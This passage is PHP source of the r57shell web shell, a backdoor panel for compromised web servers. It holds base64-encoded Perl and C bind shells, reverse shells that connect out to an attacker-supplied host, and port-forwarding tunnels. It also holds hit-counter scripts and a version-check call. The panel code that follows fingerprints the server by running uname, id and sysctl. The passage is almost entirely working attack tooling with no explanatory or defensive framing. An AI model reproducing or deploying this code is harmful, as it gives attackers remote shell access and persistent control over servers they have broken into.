dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$c1 = "PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2
JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l
lPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhkb2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndW
FnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2pzPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L
3NjcmlwdD48c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0MS4yIj5ob3Rsb2dfanM9IjEuMiI7aG90bG9nX3IrPSImd2g9IitzY3JlZW4ud2lkdGgr
J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR
oOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGxvZ19qcz0iMS4zIjwvc2NyaXB0Pj
xzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPmhvdGxvZ19yKz0iJmpzPSIraG90bG9nX2pzO2RvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwO
i8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hv
dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB
ocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2
hvdGxvZy9jb3VudD9zPTgxNjA2JmltPTEiIGJvcmRlcj0wd2lkdGg9IjEiIGhlaWdodD0iMSIgYWx0PSJIb3RMb2ciPjwvYT48L25vc2NyaXB0Pg==";
$c2 = "PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxh
IGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnl
hZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJz
tzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5wa
XhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u
8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGV
ybmV0LS0+";
echo $head;
echo '&lt;/head&gt;';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
if (!in_array($addr[0], $serv)) {
@print "&lt;img src=\"http://127.0.0.1/r57shell/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0&gt;";
@readfile ("http://127.0.0.1/r57shell/version.php?version=".$current_version."");}}
echo '&lt;body bgcolor="#396D95"&gt;&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;
&lt;tr&gt;&lt;td bgcolor=#396D95 width=160&gt;&lt;font face=Verdana size=2&gt;'.ws(1).'&nbsp;
&lt;/b&gt;&lt;/font&gt;&lt;b&gt;'.ws(2).'r57shell '.$version.'&lt;/b&gt;
&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;';
echo ws(2);
echo "&lt;b&gt;".date ("d-m-Y H:i:s")."&lt;/b&gt;";
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"&gt;&lt;b&gt;phpinfo&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"&gt;&lt;b&gt;php.ini&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"&gt;&lt;b&gt;cpu&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"&gt;&lt;b&gt;mem&lt;/b&gt;&lt;/a&gt; ".$rb;
if($unix) { echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"&gt;&lt;b&gt;users&lt;/b&gt;&lt;/a&gt; ".$rb; }
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"&gt;&lt;b&gt;tmp&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"&gt;&lt;b&gt;delete&lt;/b&gt;&lt;/a&gt; ".$rb."&lt;br&gt;";
echo ws(2);
echo (($safe_mode)?("safe_mode: &lt;b&gt;&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;"):("safe_mode: &lt;b&gt;&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;"));
echo ws(2);
echo "PHP version: &lt;b&gt;".@phpversion()."&lt;/b&gt;";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: ".(($curl_on)?("&lt;b&gt;&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;"):("&lt;b&gt;&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;"));
echo ws(2);
echo "MySQL: &lt;b&gt;";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;"; } else { echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;"; }
echo ws(2);
echo "MSSQL: &lt;b&gt;";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;";}
echo ws(2);
echo "PostgreSQL: &lt;b&gt;";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;";}
echo ws(2);
echo "Oracle: &lt;b&gt;";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "&lt;font color=white&gt;ON&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;OFF&lt;/font&gt;&lt;/b&gt;";}
echo "&lt;br&gt;".ws(2);
echo "Kapal&#305; Funtionslar : &lt;b&gt;";
if(''==($df=@ini_get('disable_functions'))){echo "&lt;font color=white&gt;NONE&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=orange&gt;$df&lt;/font&gt;&lt;/b&gt;";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo "&lt;br&gt;".ws(2)."HDD Free : &lt;b&gt;".view_size($free)."&lt;/b&gt; HDD Total : &lt;b&gt;".view_size($all)."&lt;/b&gt;";
echo '&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;table&gt;
&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;
&lt;tr&gt;&lt;td align=right width=100&gt;';
echo $font;
if(!$windows){
echo '&lt;font color=#BF0F0F&gt;&lt;b&gt;uname -a :'.ws(1).'&lt;br&gt;sysctl :'.ws(1).'&lt;br&gt;$OSTYPE :'.ws(1).'&lt;br&gt;Server :'.ws(1).'&lt;br&gt;id :'.ws(1).'&lt;br&gt;pwd :'.ws(1).'&lt;/b&gt;&lt;/font&gt;&lt;br&gt;';
echo "&lt;/td&gt;&lt;td&gt;";
echo "&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;";
$uname = ex('uname -a');
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."&lt;br&gt;"):(ws(3).@substr(@php_uname(),0,120)."&lt;br&gt;"));
if(!$safe_mode){
$bsd1 = ex('sysctl -n kern.ostype');
$bsd2 = ex('sysctl -n kern.osrelease');
$lin1 = ex('sysctl -n kernel.ostype');
$lin2 = ex('sysctl -n kernel.osrelease');
}
if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
else { $sysctl = "-"; }
echo ws(3).$sysctl."&lt;br&gt;";
echo ws(3).ex('echo $OSTYPE')."&lt;br&gt;";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."&lt;br&gt;";
$id = ex('id');
echo((!empty($id))?(ws(3).$id."&lt;br&gt;"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."&lt;br&gt;"));
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "&lt;/b&gt;&lt;/font&gt;";
}
else
{
echo '&lt;font color=#BF0F0F&gt;&lt;b&gt;OS :'.ws(1).'&lt;br&gt;Server :'.ws(1).'&lt;br&gt;User :'.ws(1).'&lt;br&gt;pwd :'.ws(1).'&lt;/b&gt;&lt;/font&gt;&lt;br&gt;';
echo "&lt;/td&gt;&lt;td&gt;";
echo "&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;";
echo ws(3).@substr(@php_uname(),0,120)."&lt;br&gt;";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."&lt;br&gt;";
echo ws(3).@get_current_user()."&lt;br&gt;";
echo ws(3).$dir;
echo "&lt;br&gt;&lt;/font&gt;";
}
echo "&lt;/font&gt;";
